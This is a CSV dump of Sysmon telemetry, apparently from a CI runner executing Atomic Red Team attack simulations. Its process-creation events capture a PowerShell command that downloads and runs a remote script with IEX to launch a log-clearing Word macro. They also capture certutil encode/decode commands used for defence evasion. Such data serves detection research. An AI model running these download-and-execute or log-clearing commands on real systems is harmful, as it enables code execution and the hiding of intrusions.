"12/17/2025 8:19:17 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:17.417
ProcessGuid: {f995aebf-6785-6942-6008-000000000e00}
ProcessId: 3256
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b1c1isx1.o2b.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:17 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:17.399
ProcessGuid: {f995aebf-6785-6942-6008-000000000e00}
ProcessId: 3256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b1c1isx1.o2b.ps1
CreationUtcTime: 2025-12-17 08:19:17.399
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:17 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:17.037
ProcessGuid: {f995aebf-6784-6942-5e08-000000000e00}
ProcessId: 5436
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2z0fq3sl.mbx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:17 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:17.017
ProcessGuid: {f995aebf-6784-6942-5e08-000000000e00}
ProcessId: 5436
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2z0fq3sl.mbx.ps1
CreationUtcTime: 2025-12-17 08:19:17.017
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:13 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:19:10.962
ProcessGuid: {f995aebf-677e-6942-5808-000000000e00}
ProcessId: 2588
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:12 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:19:10.965
ProcessGuid: {f995aebf-677e-6942-5808-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59591
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.109.133
DestinationHostname: cdn-185-199-109-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:19:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:10.742
ProcessGuid: {f995aebf-677e-6942-5808-000000000e00}
ProcessId: 2588
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34rbhpg0.ee5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:10.722
ProcessGuid: {f995aebf-677e-6942-5808-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34rbhpg0.ee5.ps1
CreationUtcTime: 2025-12-17 08:19:10.721
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:10.633
ProcessGuid: {f995aebf-677e-6942-5808-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:10.119
ProcessGuid: {f995aebf-677e-6942-5608-000000000e00}
ProcessId: 10156
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_frpdlv0x.0kd.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:10.101
ProcessGuid: {f995aebf-677e-6942-5608-000000000e00}
ProcessId: 10156
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_frpdlv0x.0kd.ps1
CreationUtcTime: 2025-12-17 08:19:10.101
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:07.231
ProcessGuid: {f995aebf-677b-6942-4d08-000000000e00}
ProcessId: 6032
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:07.021
ProcessGuid: {f995aebf-677b-6942-4b08-000000000e00}
ProcessId: 9816
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:01.248
ProcessGuid: {f995aebf-6775-6942-4408-000000000e00}
ProcessId: 5116
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CreationUtcTime: 2025-12-17 08:19:01.248
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:01.220
ProcessGuid: {f995aebf-6775-6942-4408-000000000e00}
ProcessId: 5116
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6775-6942-4108-000000000e00}
ParentProcessId: 10076
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:01.181
ProcessGuid: {f995aebf-6775-6942-4308-000000000e00}
ProcessId: 10116
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6775-6942-4108-000000000e00}
ParentProcessId: 10076
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:01.142
ProcessGuid: {f995aebf-6775-6942-4108-000000000e00}
ProcessId: 10076
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c copy %%windir%%\system32\certutil.exe %%temp%%\tcm.tmp & %%temp%%\tcm.tmp -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc2.txt & %%temp%%\tcm.tmp -decode %%temp%%\T1140_calc2.txt %%temp%%\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:00 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:00.856
ProcessGuid: {f995aebf-6774-6942-4008-000000000e00}
ProcessId: 8836
Image: C:\Windows\system32\certutil.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
CreationUtcTime: 2025-12-17 08:19:00.856
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:00.821
ProcessGuid: {f995aebf-6774-6942-4008-000000000e00}
ProcessId: 8836
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6774-6942-3d08-000000000e00}
ParentProcessId: 2136
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:00.746
ProcessGuid: {f995aebf-6774-6942-3f08-000000000e00}
ProcessId: 7464
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6774-6942-3d08-000000000e00}
ParentProcessId: 2136
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:00.714
ProcessGuid: {f995aebf-6774-6942-3d08-000000000e00}
ProcessId: 2136
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc.txt & certutil -decode %%temp%%\T1140_calc.txt %%temp%%\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:58 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:58.121
ProcessGuid: {f995aebf-6772-6942-3a08-000000000e00}
ProcessId: 6444
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:57.606
ProcessGuid: {f995aebf-6771-6942-3408-000000000e00}
ProcessId: 3624
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cfza25in.ctg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:57 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:57.589
ProcessGuid: {f995aebf-6771-6942-3408-000000000e00}
ProcessId: 3624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cfza25in.ctg.ps1
CreationUtcTime: 2025-12-17 08:18:57.588
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:57.223
ProcessGuid: {f995aebf-6771-6942-3208-000000000e00}
ProcessId: 8444
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4l1r1rhx.phi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:57 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:57.203
ProcessGuid: {f995aebf-6771-6942-3208-000000000e00}
ProcessId: 8444
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4l1r1rhx.phi.ps1
CreationUtcTime: 2025-12-17 08:18:57.203
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:56.846
ProcessGuid: {f995aebf-6770-6942-3008-000000000e00}
ProcessId: 9100
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_q3kzgwlm.fcx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:56.828
ProcessGuid: {f995aebf-6770-6942-3008-000000000e00}
ProcessId: 9100
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_q3kzgwlm.fcx.ps1
CreationUtcTime: 2025-12-17 08:18:56.828
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:56.471
ProcessGuid: {f995aebf-6770-6942-2e08-000000000e00}
ProcessId: 728
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wl04elsh.hng.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:56.455
ProcessGuid: {f995aebf-6770-6942-2e08-000000000e00}
ProcessId: 728
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wl04elsh.hng.ps1
CreationUtcTime: 2025-12-17 08:18:56.453
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:56.137
ProcessGuid: {f995aebf-6770-6942-2d08-000000000e00}
ProcessId: 2468
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:56.072
ProcessGuid: {f995aebf-6770-6942-2c08-000000000e00}
ProcessId: 2712
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:55.654
ProcessGuid: {f995aebf-676f-6942-2808-000000000e00}
ProcessId: 5040
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_faksoheh.b5o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:55.636
ProcessGuid: {f995aebf-676f-6942-2808-000000000e00}
ProcessId: 5040
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_faksoheh.b5o.ps1
CreationUtcTime: 2025-12-17 08:18:55.636
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:55.277
ProcessGuid: {f995aebf-676f-6942-2608-000000000e00}
ProcessId: 3184
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rj5zi2yd.igm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:55.259
ProcessGuid: {f995aebf-676f-6942-2608-000000000e00}
ProcessId: 3184
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rj5zi2yd.igm.ps1
CreationUtcTime: 2025-12-17 08:18:55.259
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:49.284
ProcessGuid: {f995aebf-6769-6942-2008-000000000e00}
ProcessId: 1304
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kuzimyf5.t22.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:49.264
ProcessGuid: {f995aebf-6769-6942-2008-000000000e00}
ProcessId: 1304
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kuzimyf5.t22.ps1
CreationUtcTime: 2025-12-17 08:18:49.264
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:48 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:18:46.770
ProcessGuid: {f995aebf-6766-6942-1b08-000000000e00}
ProcessId: 1340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 59583
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 80
DestinationPortName: http"
"12/17/2025 8:18:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:48.707
ProcessGuid: {f995aebf-6768-6942-1e08-000000000e00}
ProcessId: 9596
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gv2eh24f.hk5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:48.689
ProcessGuid: {f995aebf-6768-6942-1e08-000000000e00}
ProcessId: 9596
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gv2eh24f.hk5.ps1
CreationUtcTime: 2025-12-17 08:18:48.689
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:46.563
ProcessGuid: {f995aebf-6766-6942-1b08-000000000e00}
ProcessId: 1340
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_i5pqewmx.ox3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:46.545
ProcessGuid: {f995aebf-6766-6942-1b08-000000000e00}
ProcessId: 1340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_i5pqewmx.ox3.ps1
CreationUtcTime: 2025-12-17 08:18:46.545
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:46.460
ProcessGuid: {f995aebf-6766-6942-1b08-000000000e00}
ProcessId: 1340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
